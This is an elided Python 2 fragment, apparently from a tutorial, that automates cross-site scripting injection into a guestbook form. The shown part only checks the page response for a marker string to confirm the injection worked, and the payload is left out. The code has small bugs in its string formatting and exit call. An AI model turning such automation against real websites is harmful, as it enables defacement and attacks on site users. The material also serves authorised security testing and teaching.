...
# automate (injecting XSS in forms).
...
def xss_attack_guestbook(url):
  ...
  if response.code != 200:
    print 'Web Page could not be retrieved from %s. '+\
          'Please verify your URL' %(url)
    exit
  ...
  # Reading the response. If the XSS attack was succesful we will get
  # the "injected" text in the HTML body. So to verify this we will
  # look at the body
  html = br.response().readlines()
  # Converting the HTML response to string to look for the "injected" string
  str_html = str(html)
  if str_html.find("HOLA XSS Pecas") > 0:
    print '++[The injected code was found in the response.' +\
          'This attack was succesful !!]++'
